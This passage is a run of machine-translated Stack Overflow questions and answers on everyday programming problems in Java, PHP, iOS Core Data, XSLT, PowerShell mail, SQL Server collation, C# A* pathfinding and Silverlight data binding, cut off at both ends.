at org.apache.axiom.om.impl.llom.OMNodeImpl.serializeAndConsume(OMNodeImpl.java:421)
at org.apache.axis2.transport.http.SOAPMessageFormatter.writeTo(SOAPMessageFormatter.java:68)
at org.apache.axis2.transport.http.AxisRequestEntity.writeRequest(AxisRequestEntity.java:84)
at org.apache.commons.httpclient.methods.EntityEnclosingMethod.writeRequestBody(EntityEnclosingMethod.java:499)
at org.apache.commons.httpclient.HttpMethodBase.writeRequest(HttpMethodBase.java:2114)
at org.apache.commons.httpclient.HttpMethodBase.execute(HttpMethodBase.java:1096)
at org.apache.commons.httpclient.HttpMethodDirector.executeWithRetry(HttpMethodDirector.java:398)
at org.apache.commons.httpclient.HttpMethodDirector.executeMethod(HttpMethodDirector.java:171)
at org.apache.commons.httpclient.HttpClient.executeMethod(HttpClient.java:397)
at org.apache.commons.httpclient.HttpClient.executeMethod(HttpClient.java:346)
at org.apache.axis2.transport.http.AbstractHTTPSender.executeMethod(AbstractHTTPSender.java:520)
at org.apache.axis2.transport.http.HTTPSender.sendViaPost(HTTPSender.java:191)
at org.apache.axis2.transport.http.HTTPSender.send(HTTPSender.java:77)
at org.apache.axis2.transport.http.CommonsHTTPTransportSender.writeMessageWithCommons(CommonsHTTPTransportSender.java:327)
at org.apache.axis2.transport.http.CommonsHTTPTransportSender.invoke(CommonsHTTPTransportSender.java:206)
at org.apache.axis2.engine.AxisEngine.send(AxisEngine.java:396)
at org.apache.axis2.description.OutInAxisOperationClient.send(OutInAxisOperation.java:374)
at org.apache.axis2.description.OutInAxisOperationClient.executeImpl(OutInAxisOperation.java:211)
at org.apache.axis2.client.OperationClient.execute(OperationClient.java:163) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:24:05.483

目标服务器上存在无效证书的问题，如果这有助于将人们指向正确的方向，则会导致此问题。

# java - 在 catch 块中重新抛出异常是否有意义？

> ID：13822203
> 
> 赞同：4
> 
> 时间：2012-12-11T14:48:24.133
> 
> 标签：java, exception

从 catch 块中抛出异常只是为了记录消息以便我们确定导致异常的原因是否有意义？

**代码**

```
 public void saveLogs(Logs logs) throws RemoteException
  {
        try
        {
            LogsOps.saveLogs(logs);
        }
        catch (RemoteException e)
        {
            log.info("RemoteException is thrown while trying to save logs ", e);
            throw new RemoteException("RemoteException caused while trying to save", e);
        }
    } 
```

为了响应下面的评论之一，该方法会抛出 StackOverFlow 异常，这里是 log.info 的实际实现，它只显示这些错误。

```
 /** Log the message and the exception with a level of INFO.
     * @param message - The message text.
     * @param t - An exception to display.
     */
    public void info(Object message, Throwable t)
    {
        String nullSafeMessage = (message != null) ? message.toString() : t.getClass().getSimpleName();
        log.info(nullSafeMessage, t);
    } 
```

所以永远不会抛出 Stackoverflow 异常。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-11T14:51:19.590

这取决于将要捕获更高级别的异常。如果没有*其他东西*会记录该消息，那么当然，这是有道理的——尽管我可能会重新抛出*原始*异常而不是创建一个新异常：

```
catch (RemoteException e)
{
    log.info("RemoteException is thrown while trying to save logs ", e);
    throw e;
} 
```

但是，理想情况下，您应该`catch`在堆栈更高的位置有一个块，它会适当地记录 - 如果您*只是*记录异常，那么无论如何都可以获得所有信息。

当您想要记录异常*中不*存在的信息（例如参数值）时，捕获/记录/重新抛出*可能*是有意义的。

 ** * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T14:51:48.783

假设您最终将处理传播的异常，这种 catch-log-rethrow 策略只会弄乱日志文件。想象一下，这是在堆栈跟踪的整个过程中完成的——你最终会得到大量没有用处的冗余错误信息。

如果你不处理异常，你也不应该记录它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:01:16.420

除了用于日志记录之外，这种方法还可用于在失败的情况下执行必要的清理，然后再将控制权返回给堆栈中的调用者。

例如

```
InputStream is = new InputStream( ... )

try {

    is.read(...);

    return is;

} catch ( IOException ioe ) {
    is.close();
    throw ioe;
} 
```

当然，这是一种有点特殊的用法，大多数情况下可以通过使用`finally`子句优雅地避免 - 但并非总是如此，如上面的例子所示。*

# php - 更改 PHP 关联数组最里面的值

> ID：13822205
> 
> 赞同：0
> 
> 时间：2012-12-11T14:48:42.527
> 
> 标签：php, associative-array

我想将一个字符串附加到 PHP 中嵌套关联数组的值中。

以下是我的数组

```
$styles = array(
    'Screen' => array(
        "master.css",
        "jquery-jvectormap-1.0.css"),
    'handheld' => array("mobile.css") 
     ); 
```

循环遍历它以按以下方式更改它失败。

```
foreach($media as $medium => $filename)
foreach($filenames as &$filename)
    $filename = "/styles/".$filename; 
```

`$medium`加前缀`&`just 会导致语法错误。

这也失败了。

```
function prepend($prefix,$string)
{
return $prefix.$string;
}

foreach($media as &$medium)
  $medium = array_map(prepend("/styles"),$medium); 
```

给定这种数据结构`"/styles/"`，为这些文件名添加前缀的最简单方法是什么？`css`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:58:12.030

尝试这个：

```
foreach($styles as $medium => &$filenames) {
  foreach($filenames as &$filename) {
    $filename = "/styles/".$filename;
  }
} 
```

一些技巧：

*   使用大括号来构建嵌套代码。这将使您（和 php）更好地理解您的意思
*   使用缩进。这将为您提供更好的概览。
*   使用数组变量的单数命名迭代变量（即 foreach($apples as $apple)）。这将为您提供有关您正在处理的变量的额外提示。

祝你好运！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T14:56:15.940

尝试这个：

```
$styles = array(
    'Screen' => array(
        "master.css",
        "jquery-jvectormap-1.0.css"),
    'handheld' => array("mobile.css") 
     );

foreach($styles as $k=>$v){
    foreach($v as $a=>$b){
        $styles[$k][$a] = '/styles/'.$b;
    }
}

print_r($styles); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T14:58:13.937

```
foreach($media as $medium => $filenames) {
    foreach($filenames as $key => $filename) {
        $media[$medium][$key] = "/styles/" . $filename;
    }
} 
```

# iphone - NSFetchResultController 我在数组中使用带有属性的谓词？

> ID：13822208
> 
> 赞同：0
> 
> 时间：2012-12-11T14:48:54.107
> 
> 标签：iphone, ios, ipad, core-data

在`NSFetchRsultController`我使用：

```
[NSPredicate predicateWithFormat:@"type in %@", myArray]; 
```

我希望数据按数组中数据的顺序排列，但是`NSSortDescriptor`对于 是强制性的`NSFetchResultController`，那么`NSSortDescriptor`我必须使用什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T15:52:35.807

用户1800529，

看来您希望将顺序顺序的东西插入到您的数据库中。Core Data 不保证该顺序。因此，您需要选择要排序的东西。我使用创建时间，这是在我的大多数实体中，但您可以轻松地使用另一个属性。

安德鲁

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T17:36:11.883

您可以使用`sortDescriptors`按照数组的顺序对数据进行排序。

> 排序描述符指定发出获取请求时返回的对象应如何排序——例如，按姓氏然后按名字。排序描述符按照它们在 sortDescriptors 数组中出现的顺序应用（以最低数组索引优先顺序）。

代码示例：

```
...
NSMutableArray * sortDescriptors = [[NSMutableArray alloc] initWithCapacity:[myArray count]];
for (NSString * key in myArray)
  [sortDescriptors addObject:[[NSSortDescriptor alloc] initWithKey:key ascending:NO]];

[fetchRequest setSortDescriptors:sortDescriptors];
[sortDescriptors release];
... 
```

# java - XSLT 调用嵌入 XML 的 java

> ID：13822212
> 
> 赞同：4
> 
> 时间：2012-12-11T14:48:00.007
> 
> 标签：java, xml, xslt, tags

我有一个 xsl 片段：

```
<GOGO>
     <xsl:variable name="test">
        <xsl:copy-of select="response"/>
     </xsl:variable>
     <xsl:copy-of select="javamap:echo($test)"/>
</GOGO> 
```

这段代码调用了一个 java 方法：

```
public static String echo(String a) {
    System.out.println("HERE I AM:"+a+":");
    return "<xxx>" + a + "</xxx>";
} 
```

如果我只有以下代码段：

```
<GOGO>
<xsl:copy-of select="response"/>
</GOGO> 
```

结果转换将类似于：

```
<foo>val1</foo>
<bar>val2</bar> 
```

但是，当调用 Java 方法时，系统输出输出是出乎意料的，仅打印输出：

```
val1
val2 
```

我在做什么错，如何让 java 方法输出预期的 xml 片段？

编辑：回答帮助我的人的问题：我正在使用 Saxon9。另一个线程中的某个人向我展示了 value-of 和 disable-output-escaping="yes" 的用法，这使我可以在输出中打印出 xxx 元素标记。但是，我仍然对输入端感到困惑，我希望我的 java 类能够完全了解我传递给它的完整 xml 片段。

foo 和 bar 标签是我想要传递给 java 函数的 xml。在 java 函数内部，我想进一步将 xml 包装在 xxx 标记中。

编辑 2：下面的提示允许我得出以下解决方案： public static String echo(Node a) throws Exception {

```
 StringWriter writer = new StringWriter();
    Transformer transformer = TransformerFactory.newInstance().newTransformer();
    transformer.transform(new DOMSource(a), new StreamResult(writer));
    String xml = writer.toString();
    return xml;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T17:04:15.957

扩展函数的语义取决于你正在使用的处理器，你没有告诉我们，但我认为任何处理器都不太可能按照你期望的方式工作——也就是说，处理函数返回的字符串作为要解析并转换为节点的词法 XML。如果要返回一个节点，则必须在返回之前构造一个节点。节点的类型（例如，它是否是 DOM 节点，它属于什么文档等）将取决于系统；总的来说，我建议不要在扩展函数中操作节点——XSLT 做得更好。

# email - 发送邮件消息（1GB 附件）PowerShell

> ID：13822213
> 
> 赞同：0
> 
> 时间：2012-12-11T14:49:07.287
> 
> 标签：email, powershell, exchange-server

有没有办法我们可以使用发送邮件消息发送巨大的附件，我尝试了下面的代码片段，但它总是超时。请注意，它是一个测试实验室设置，邮箱相关属性设置为无限制，所以我没有从管理点丢失任何东西.

```
 PS C:\Users\administrator.SMETEST> Send-MailMessage -From "loadtest@smetest.com" -To "loadtestuser4@smetest.com" -SmtpSe
    rver HUB -Subject hi -Attachments "C:\officesuite2010sp1-kb2460049-x86-fullfile-en-us.exe" -Verbose

    Send-MailMessage : The operation has timed out.
    At line:1 char:17
    + Send-MailMessage <<<< -From "loadtest@smetest.com" -To "loadtestuser4@smetest.com" -SmtpServer HUB -Subje
    ct hi -Attachments "C:\officesuite2010sp1-kb2460049-x86-fullfile-en-us.exe" -Verbose
    + CategoryInfo : InvalidOperation: (System.Net.Mail.SmtpClient:SmtpClient) [Send-MailMessage], SmtpExcept
    ion
    + FullyQualifiedErrorId : SmtpException,Microsoft.PowerShell.Commands.SendMailMessage 
```

尝试了以下方法，它仍然超时

```
PS C:\Users\administrator.SMETEST> Send-MailMessage -From "loadtest@smetest.com" -To "loadtestuser4@smetest.com" -SmtpSe
rver HUB -Subject hi -Attachments "C:\ADCheck.ps1"
PS C:\Users\administrator.SMETEST> Add-PSSnapin Microsoft.Exchange.Management.Powershell.Admin -erroraction silentlyCont
inue
PS C:\Users\administrator.SMETEST> $file = "C:\officesuite2010sp1-kb2460049-x86-fullfile-en-us.exe"
PS C:\Users\administrator.SMETEST> $smtpServer = "HUB"
PS C:\Users\administrator.SMETEST> $att = new-object Net.Mail.Attachment($file)
PS C:\Users\administrator.SMETEST> $msg = new-object Net.Mail.MailMessage
PS C:\Users\administrator.SMETEST> $smtp = new-object Net.Mail.SmtpClient($smtpServer)
PS C:\Users\administrator.SMETEST> $msg.From = "loadtest@smetest.com"
PS C:\Users\administrator.SMETEST> $msg.To.Add("loadtestuser4@smetest.com")
PS C:\Users\administrator.SMETEST> #$msg.To.Add("administrator2@test.com")
PS C:\Users\administrator.SMETEST> $msg.Subject = "Notification from email server"
PS C:\Users\administrator.SMETEST> $msg.Body = "Attached is the email server mailbox report"
PS C:\Users\administrator.SMETEST> $msg.Attachments.Add($att)
PS C:\Users\administrator.SMETEST> $smtp.Send($msg)
Exception calling "Send" with "1" argument(s): "The operation has timed out."
At line:1 char:11
+ $smtp.Send <<<< ($msg)
+ CategoryInfo : NotSpecified: (:) [], MethodInvocationException
+ FullyQualifiedErrorId : DotNetMethodException

PS C:\Users\administrator.SMETEST> $att.Dispose()
PS C:\Users\administrator.SMETEST> 
```

# pandoc - 如何从 Httpie 使用 Docverter？

> ID：13822214
> 
> 赞同：0
> 
> 时间：2012-12-11T14:49:07.767
> 
> 标签：pandoc, httpie, docverter

我正在尝试使用来自[httpie的](http://www.docverter.com/)[docverter](https://github.com/jkbr/httpie)呈现文档。所有示例都是针对 Curl 的。我试过了

```
http -f POST http://c.docverter.com/convert from=markdown to=html input_files@example.txt --output out.html 
```

但是网站会报错

> /convert 处的 TypeError
> 无法将 Symbol 转换为 Integer

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-15T04:33:42.457

你已经很接近了。您的`http`调用应如下所示：

```
http --form -f POST http://c.docverter.com/convert from=markdown to=html input_files[]@example.md --output out.html && open out.html 
```

在调试时，我发现了一个错误的错字并发布了 v1.0.1 并将其安装在公共实例上。

# asp.net - 你怎么知道一个 dll 是否是“可部署的”？

> ID：13822217
> 
> 赞同：0
> 
> 时间：2012-12-11T14:48:44.383
> 
> 标签：asp.net

我正在使用[SmartIrc4bet](https://www.meebey.net/projects/smartirc4net/)允许我网站的访问者在 irc 上聊天。我的网站是 4.0，但 dll 是 2.0。在本地一切正常（连接、加入房间、使用网页作为门户发送和接收消息）。

当我将它上传到我的主机时，它会中断。ASP.NET 应用程序的其余部分工作正常，Web 检查器中没有 JavaScript 错误。所以这是一种无声的崩溃。

我给我的主机发了电子邮件，他们说要确保 dll 是可部署的，但我不知道那是什么。

# php - Joomla K2 在 generic.php 上显示额外的字段

> ID：13822219
> 
> 赞同：1
> 
> 时间：2012-12-11T14:49:30.070
> 
> 标签：php, mysql, joomla, joomla-k2

我们正在开发一个基于k2的网站。为此，我们利用额外字段为文章提供特定的 css 类。

但是当我们使用归档扩展时，这个类没有被应用，我们得到一个错误。

这是我们得到的错误

> 警告：在第 19 行的 /home/recall/domains/domain.com/public_html/templates/mytemplate/html/com_k2/generic.php 中为 foreach() 提供的参数无效

这是代码

```
<!-- START: Call to prepare extra fields -->
<?php  
//convertArray to use ids as key
$extrafields = array();
foreach($this->item->extra_fields as $item)
{    
$extrafields[$item->id] = $item->value;
}   
?>    
<!-- END: Call to prepare extra fields -->

<!-- Start K2 Generic (search/date) Layout -->
<div id="k2Container" class="genericView<?php echo $this->escape($this->params->get('page-id')); ?> nieuwsarchief">

        <?php if($this->params->get('genericFeedIcon',1)): ?>
        <!-- RSS feed icon -->
        <ul class="k2SendReceiveNews">
                <li class="legende_bestuur"><span>Bestuur</span></li>
                <li class="legende_regio"><span>Regio</span></li>
                <li class="legende_school"><span>School</span></li>
                <li><a href="#">Nieuws melden</a></li>
                <li><a href="#">Nieuws via e-mail ontvangen</a></li>
                <li class="rssfeed"><a href="<?php echo $this->feed; ?>" title="<?php echo JText::_('K2_SUBSCRIBE_TO_RSS'); ?>">
                        <span><?php echo JText::_('K2_SUBSCRIBE_TO_RSS'); ?></span>
                </a></li>
                <div class="clr"></div>
        </ul>
        <?php endif; ?>

        <?php if($this->params->get('show_page_title')): ?>
        <!-- Page title -->
        <div class="componentheading<?php echo $this->params->get('pageclass_sfx')?>">
                <?php echo $this->escape($this->params->get('page_title')); ?>
        </div>
        <?php endif; ?>

        <?php if(count($this->items)): ?>
        <div>
                <?php foreach($this->items as $item): ?>

                <!-- Start K2 Item Layout -->
                <div class="CatItem-<?php echo $extraFlds['Nieuwscategorie']; ?>">
                <?php
echo $item->extra_fields[11]->value;
?>

                        <div class="catItemContent catItemHeader">

                          <?php if($this->params->get('genericItemTitle')): ?>
                          <!-- Item title -->
                          <h3 class="catItemTitle">
                                <?php if ($this->params->get('genericItemTitleLinked')): ?>
                                        <a href="<?php echo $item->link; ?>">
                                        <?php echo $item->title; ?>
                                </a>
                                <?php else: ?>
                                <?php echo $item->title; ?>
                                <?php endif; ?>
                          </h3>
                          <?php endif; ?>
                          <?php if($this->params->get('genericItemDateCreated')): ?>
                                <!-- Date created -->
                                <span class="genericItemDateCreated">
                                        <?php echo JHTML::_('date', $item->created , JText::_('DATE_FORMAT_LC10')); ?>
                                </span>
                                <?php endif; ?>
                  </div>

                </div>
                <!-- End K2 Item Layout -->

                <?php endforeach; ?>
        </div>

        <!-- Pagination -->
        <?php if($this->pagination->getPagesLinks()): ?>
        <div class="k2Pagination">
                <?php echo $this->pagination->getPagesLinks(); ?>
                <div class="clr"></div>
                <?php echo $this->pagination->getPagesCounter(); ?>
        </div>
        <?php endif; ?>

        <?php endif; ?>

</div>
<!-- End K2 Generic (search/date) Layout --> 
```

* * *

我自己找到了解决方案。

这是最终代码：

```
<?php
/**
 * @version     $Id: generic.php 1618 2012-09-21 11:23:08Z lefteris.kavadas $
 * @package     K2
 * @author      JoomlaWorks http://www.joomlaworks.net
 * @copyright   Copyright (c) 2006 - 2012 JoomlaWorks Ltd. All rights reserved.
 * @license     GNU/GPL license: http://www.gnu.org/copyleft/gpl.html
 */

// no direct access
defined('_JEXEC') or die;

?>

<!-- Start K2 Generic (search/date) Layout -->
<div id="k2Container" class="genericView<?php echo $this->escape($this->params->get('page-id')); ?> nieuwsarchief">

    <?php if($this->params->get('genericFeedIcon',1)): ?>
    <!-- RSS feed icon -->
    <ul class="k2SendReceiveNews">
        <li class="legende_bestuur"><span>Bestuur</span></li>
        <li class="legende_regio"><span>Regio</span></li>
        <li class="legende_school"><span>School</span></li>
        <li><a href="#">Nieuws melden</a></li>
        <li><a href="#">Nieuws via e-mail ontvangen</a></li>
        <li class="rssfeed"><a href="<?php echo $this->feed; ?>" title="<?php echo JText::_('K2_SUBSCRIBE_TO_RSS'); ?>">
            <span><?php echo JText::_('K2_SUBSCRIBE_TO_RSS'); ?></span>
        </a></li>
        <div class="clr"></div>
    </ul>
    <?php endif; ?>

    <?php if($this->params->get('show_page_title')): ?>
    <!-- Page title -->
    <div class="componentheading<?php echo $this->params->get('pageclass_sfx')?>">
        <?php echo $this->escape($this->params->get('page_title')); ?>
    </div>
    <?php endif; ?>

    <?php if(count($this->items)): ?>
    <div>

        <?php foreach($this->items as $item): ?>

        <!-- START: Call to prepare extra fields -->
        <?php
        //convertArray to use ids as key
        $extrafields = array();
        foreach($item->extra_fields as $extraFlds)
        {    
        $extrafields[$extraFlds->id] = $extraFlds->value;
        }   
        ?>    
        <!-- END: Call to prepare extra fields -->

        <!-- Start K2 Item Layout -->
        <div class="CatItem-<?php echo $extrafields[11];?>">

            <div class="catItemContent catItemHeader">

              <?php if($this->params->get('genericItemTitle')): ?>
              <!-- Item title -->
              <h3 class="catItemTitle">
                <?php if ($this->params->get('genericItemTitleLinked')): ?>
                    <a href="<?php echo $item->link; ?>">
                    <?php echo $item->title; ?>
                </a>
                <?php else: ?>
                <?php echo $item->title; ?>
                <?php endif; ?>
              </h3>
              <?php endif; ?>
              <?php if($this->params->get('genericItemDateCreated')): ?>
                <!-- Date created -->
                <span class="genericItemDateCreated">
                    <?php echo JHTML::_('date', $item->created , JText::_('DATE_FORMAT_LC10')); ?>
                </span>
                <?php endif; ?>
          </div>

        </div>
        <!-- End K2 Item Layout -->

        <?php endforeach; ?>
    </div>

    <!-- Pagination -->
    <?php if($this->pagination->getPagesLinks()): ?>
    <div class="k2Pagination">
        <?php echo $this->pagination->getPagesLinks(); ?>
        <div class="clr"></div>
        <?php echo $this->pagination->getPagesCounter(); ?>
    </div>
    <?php endif; ?>

    <?php endif; ?>

</div>
<!-- End K2 Generic (search/date) Layout --> 
```

对于正确的值，在k2额外字段的后端找到对应的id（在右边）

对我来说是**id 11**

```
<?php echo $extrafields[11];?> 
```

# sql-server - SQL Server 中的 ORDER BY ... COLLATE

> ID：13822220
> 
> 赞同：10
> 
> 时间：2012-12-11T14:49:33.633
> 
> 标签：sql-server, sql-order-by, collation, case-sensitive

在 SQL Server 下。一个表格包含一些不同大小写的文本。我想对它们进行区分大小写的排序，并认为 a`COLLATE`会这样做`ORDER BY`。它没有。为什么？

```
CREATE TABLE T1 (C1 VARCHAR(20))
INSERT INTO T1 (C1) VALUES ('aaa1'), ('AAB2'), ('aba3')

SELECT * FROM T1 ORDER BY C1 COLLATE Latin1_General_CS_AS
SELECT * FROM T1 ORDER BY C1 COLLATE Latin1_General_CI_AS 
```

两个查询返回相同，即使第一个是“CS”表示区分大小写

```
aaa1
AAB2
aba3 
```

（在第一种情况下，我想要`AAB2, aaa1, aba3`）

我的服务器是 SQL Server Express 2008 (10.0.5500)，它的默认服务器排序规则是`Latin1_General_CI_AS`.

数据库的排序规则也是`Latin1_General_CI_AS`如此。

如果我使用`SQL_Latin1_General_CP1_CS_AS`.`Latin1_General_CS_AS`

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-11T14:52:36.220

您需要使用`A-Z`sorted before对所需的排序顺序进行二进制排序`a-z`。

```
SELECT * FROM T1 ORDER BY C1 COLLATE Latin1_General_bin 
```

CS 排序规则排序`aAbB ... zZ`

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-11T14:52:51.697

因为那**是**正确的区分大小写的排序顺序。[Case Sensitive Collat​​ion Sort Order](http://rusanu.com/2012/11/23/case-sensitive-collation-sort-order/)中解释了为什么会这样，它与[Unicode 排序规范有关](http://www.unicode.org/reports/tr10/)。`aa`会排在前面，`AA`但`AA`会排在前面`ab`。

# c# - A* 寻路算法并不总是找到最短路径 C# XNA

> ID：13822222
> 
> 赞同：3
> 
> 时间：2012-12-11T14:49:35.060
> 
> 标签：c#, xna, path-finding, a-star

我正在创建一个简单的 XNA C# 自上而下的游戏。在游戏中，您将被一个像迷宫一样的地图周围的敌人跟踪。ATM 我已经设置好了，当游戏开始时，敌人会找到通往你的最短路径（它确实如此）。如果玩家移动了，则每秒都会找到一条新路径。

游戏总能找到一条通往你的路线，但似乎很难找到通往移动目标的最短路线，有时在你移动时会进入循环，当你停下来时，敌人会绕着地图绕半圈找到你，即使你只有几步之遥。它似乎不是启发式的，因为我删除了它（使其成为dijkstra），它似乎仍然存在同样的问题。我认为这是我忽略的简单事情，但我无法弄清楚是什么。

提前致谢

```
 class PathFinder
{
    private Cell[,] map = Game1.cellArray;

    public List<Cell> calculate(int currX, int currY, int destX, int destY)
    {
        resetMap();

        Debug.WriteLine("starting over");
        List<Cell> path = new List<Cell>();
        List<Cell> openList = new List<Cell>();
        List<Cell> closedList = new List<Cell>();

        Cell startPos = map[currY, currX];
        Cell endPos = map[destY, destX];
        startPos.closed = true;
        closedList.Add(startPos);

        Cell curPos = startPos;

        while (!closedList.Contains(endPos))
        {

            //add adjacent nodes to list, discover their scores
            foreach (Cell v in getAdj(curPos))
            {
                if (v.walkable == true && v.closed == false)
                {
                    if (!openList.Contains(v))
                    {
                        v.parent = curPos;
                        v.H = getH(v, endPos);
                        v.G = v.parent.G + 10;

                        v.F = v.G + v.H;
                        openList.Add(v);

                    }
                        //if square already on list would benefit from current tile being parent, make it so
                    else if (curPos.G + 10 < v.G)
                    {
                        v.parent = curPos;
                        v.G = v.parent.G + 10;
                        v.F = v.G + v.H;
                    }
                }
            }
            if (openList.Count <= 1) {/*Console.WriteLine("Returned NULL");*/ return null; }

            curPos = openList[1];

            curPos.closed = true;
            closedList.Add(curPos);
            openList[1] = openList[openList.Count - 1];
            openList.RemoveAt(openList.Count - 1);

            openList.OrderBy(o => o.F);
            openList.Reverse();

        }

        //backtrack to discover path
        Cell curNode = endPos;
        path.Add(endPos);
        while (curNode != startPos)
        {
            curNode = curNode.parent;
            path.Add(curNode);
            Debug.WriteLine("Path// X: " + curNode.xLocation + " Y: " + curNode.yLocation);
        }

        path.Reverse();
        return path;
    }
    //finds heuristic of current square by checking distance to destination ignoring walls 
    private int getH(Cell curPos, Cell endPos)
    {
        int diffX = curPos.xLocation - endPos.xLocation;
        int diffY = curPos.yLocation - endPos.yLocation;

        if (diffX < 0)
        {
            diffX *= -1;
        }
        if (diffY < 0)
        {
            diffY *= -1;
        }
        return ((diffX + diffY) * 10);
    }

    //get list of adjacent Cells
    private List<Cell> getAdj(Cell curPos)
    {
        List<Cell> adjList = new List<Cell>();

       if (curPos.xLocation - 1 >= 0){
            adjList.Add(map[curPos.yLocation, curPos.xLocation - 1]);
        }
        if (curPos.xLocation < 19)
        {
            adjList.Add(map[curPos.yLocation, curPos.xLocation + 1]);
        }
        if (curPos.yLocation - 1 >= 0)
        {
            adjList.Add(map[curPos.yLocation - 1, curPos.xLocation]);
        }
        if (curPos.yLocation < 19)
        {
            adjList.Add(map[curPos.yLocation + 1, curPos.xLocation]);
        }

        return adjList;
    }

    private void resetMap()
    {
        //reset Cells to default values
        for (int r = 0; r < map.GetLength(1); r++)
        {
            for (int c = 0; c < map.GetLength(0); c++)
            {
                map[r, c].reset();
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T17:03:26.503

刚刚解决了问题。在更改当前选定的图块之前未进行排序。我以为我给他们打分不正确，哈哈。

# c++ - Visual Studio 2012 的新 C++ 单元测试框架是否可移植？

> ID：13822224
> 
> 赞同：3
> 
> 时间：2012-12-11T14:49:39.070
> 
> 标签：c++, unit-testing, visual-studio-2012, portability, vs-unit-testing-framework

我感兴趣的 VS2012 的新特性之一是集成的 C++ 单元测试框架。但是，如果它将我锁定在 Windows / Visual Studio 平台，我不想使用它。有谁知道它的便携性吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T14:56:44.223

它是 VS2012 的一部分，因此仅适用于 Windows。

# iphone - 如何创建发光的字体？

> ID：13822225
> 
> 赞同：1
> 
> 时间：2012-12-11T14:49:39.897
> 
> 标签：iphone, ios, ipad, cocoa-touch

我想知道如何创建一个看起来像这样的发光字体：

![在此处输入图像描述](../Images/1ac23b9de93144c756941a315354398c.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T14:58:30.523

您示例中对字体的效果几乎可以肯定是通过图像实现的。他们很可能使用 Photoshop 创建图像，然后根据需要以编程方式添加和删除子视图，以显示数字、星期几等。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T14:56:47.150

试试这个教程，它也包括源代码，你可能会发现它有帮助

[http://www.redrobotstudios.com/blog/2010/04/29/create-glow-soft-shadow-text-on-iphone/](http://www.redrobotstudios.com/blog/2010/04/29/create-glow-soft-shadow-text-on-iphone/)

# silverlight - 如果绑定，属性将不会更新其值

> ID：13822228
> 
> 赞同：0
> 
> 时间：2012-12-11T14:49:47.253
> 
> 标签：silverlight, windows-phone

我需要一个只显示所选项目的 ItemsControl，所以我编写了一个自定义的 ItemsControl，如下所示：

```
public class TabView : ItemsControl
{
    public static readonly DependencyProperty SelectedItemProperty = 
        DependencyProperty.Register(
            "SelectedItem",
            typeof(object),
            typeof(TabView),
            new PropertyMetadata(new PropertyChangedCallback(SelectedItemPropertyChanged)));
    private static void SelectedItemPropertyChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
        //throw new NotImplementedException();
    }

    public object SelectedItem
    {
        get { return GetValue(SelectedItemProperty); }
        set { OnSelectedItemChanged(value); }
    }

    public TabView()
        : base()
    {
    }

    protected override void OnItemsChanged(System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
    {
        base.OnItemsChanged(e);

        if (!IsItem(SelectedItem))
        {
            if (Items.Count > 0)
                SelectedItem = Items[0];
            else
                SelectedItem = null;
        }
    }

    protected override bool IsItemItsOwnContainerOverride(object item)
    {
        return false;
    }

    protected override DependencyObject GetContainerForItemOverride()
    {
        Grid grid = new Grid();
        grid.VerticalAlignment = System.Windows.VerticalAlignment.Stretch;
        grid.HorizontalAlignment = System.Windows.HorizontalAlignment.Stretch;

        return grid;
    }

    protected virtual void OnSelectedItemChanged(object newItem)
    {
        if (SelectedItem == newItem) return;

        if (!IsItem(newItem))
        {
            Debugger.Log(0, "TRACE", "TABVIEW: Index Out of Bounds"+Environment.NewLine);
            return;
        }

        foreach (var item in Items)
        {
            var container = ItemContainerGenerator.ContainerFromItem(item);
            if (container != null)
            {
                if (item == newItem)
                    container.SetValue(Control.VisibilityProperty, Visibility.Visible);
                else
                    container.SetValue(Control.VisibilityProperty, Visibility.Collapsed);
            }
        }

        SetValue(SelectedItemProperty, newItem);
    }

    private bool IsItem(object item)
    {
        return Items.Contains(item);
    }

} 
```

现在我将我的 Dataobject **SelectedDataTab** (MainViewModel.SelectedDataTab) 绑定到 TabView.SelectedItem。

```
 <uc:TabView 
            ItemsSource="{Binding BrowserTabs}" 
            SelectedItem="{Binding SelectedDataTab}">

            <uc:TabView.ItemTemplate>
                <DataTemplate>
                    <local:SlitteTabViewSelector Content="{Binding}" HorizontalContentAlignment="Stretch" VerticalContentAlignment="Stretch">
                        <local:SlitteTabViewSelector.Browser>
                            <DataTemplate>
                                <uc:CustomBrowser Margin="0,0,0,0" />
                            </DataTemplate>
                        </local:SlitteTabViewSelector.Browser>
                        <local:SlitteTabViewSelector.MoreTabs>
                            <DataTemplate>
                                <uc:MoreTabsControl Margin="0,0,0,0" />
                            </DataTemplate>
                        </local:SlitteTabViewSelector.MoreTabs>
                    </local:SlitteTabViewSelector>
                </DataTemplate>
            </uc:TabView.ItemTemplate>

        </uc:TabView> 
```

如果我现在开始更改MainViewModel **TabView.SelectedItem中的****SelectedDataTab**不会改变它的值！我错过了什么？我想如果我将该属性绑定到我的 MainViewModel.SelectedDataTab 它的值会根据绑定值进行更新。

 ****更新：**我的 MainViewModel 正确实现了 INotifyPropertyChanged，如果更改，SelectedDataTab 将触发它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T13:42:45.497

**已解决首先，Binding 不会触发 Property getter/setter，而是触发 SelectedItemPropertyChanged **。****

 **但是在我的代码中 SelectedItemPropertyChanged 不会被解雇，因为

```
protected override void OnItemsChanged(System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
{
    base.OnItemsChanged(e);

    if (!IsItem(SelectedItem))
    {
        if (Items.Count > 0)
            SelectedItem = Items[0];
        else
